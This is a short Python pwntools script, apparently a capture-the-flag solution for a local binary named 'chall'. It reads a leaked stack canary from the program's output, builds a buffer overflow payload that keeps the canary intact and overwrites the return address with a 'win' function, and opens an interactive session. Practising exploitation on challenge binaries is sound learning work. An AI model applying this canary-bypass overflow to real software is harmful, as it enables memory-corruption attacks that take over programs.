#!/usr/bin/env python3

# Title:        XXX.py
# Description:  X
# Author:       bluecosmo

from pwn import *

elf = context.binary = ELF("./chall")
p = process(elf.path)

a_win = p64(elf.symbols["win"])

# Get the canary
p.recvuntil(b"(")
canary = p64(int(p.recv(18).decode(), 16))

# Craft payload
payload = b"A" * (0x20 - 0x8) # Buffer
payload += canary # Canary
payload += b"B" * 0x8 # RBP
payload += a_win

# Send payload
p.sendline(payload)
p.interactive()
